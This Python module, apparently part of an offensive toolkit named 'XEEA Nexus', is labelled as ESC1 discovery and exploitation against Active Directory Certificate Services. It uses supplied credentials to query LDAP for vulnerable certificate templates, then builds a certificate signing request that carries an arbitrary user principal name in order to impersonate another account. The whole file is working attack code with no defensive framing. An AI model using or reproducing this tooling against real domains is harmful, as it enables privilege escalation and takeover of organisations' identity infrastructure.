#!/usr/bin/env python3
"""
    XEEA Nexus - CertMaster Module
    ESC1 Discovery and Exploitation.
"""

import base64
from ldap3 import Server, Connection, NTLM, ALL
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa

class NexusCertMaster:
    def __init__(self, target, username, password, domain):
        self.target = target
        self.username = username
        self.password = password
        self.domain = domain
        self.base_dn = ','.join([f'DC={p}' for p in domain.split('.')])

    def scan_esc1(self):
        server = Server(self.target, get_info=ALL)
        conn = Connection(server, user=f'{self.domain}\\{self.username}', password=self.password, authentication=NTLM, auto_bind=True)
        
        # Filter: Enrollee Supplies Subject (0x10000) and Client Authentication (1.3.6.1.5.5.7.3.2)
        search_filter = "(&(objectCategory=pKICertificateTemplate)(msPKI-Certificate-Name-Flag:1.2.840.113556.1.4.803:=65536)(pKIExtendedKeyUsage=1.3.6.1.5.5.7.3.2))"
        config_dn = f"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{self.base_dn}"
        
        conn.search(config_dn, search_filter, attributes=['cn', 'displayName'])
        return [str(entry.cn) for entry in conn.entries]

    def generate_csr(self, common_name, alt_upn):
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        csr = x509.CertificateSigningRequestBuilder().subject_name(x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, common_name),
        ])).add_extension(
            x509.SubjectAlternativeName([
                x509.OtherName(x509.ObjectIdentifier("1.3.6.1.4.1.311.20.2.3"), alt_upn.encode('utf-16le')),
            ]),
            critical=False,
        ).sign(key, hashes.SHA256())
        
        key_pem = key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        )
        
        with open(f"{common_name}_nexus.key", "wb") as f:
            f.write(key_pem)
            
        return base64.b64encode(csr.public_bytes(serialization.Encoding.DER)).decode()
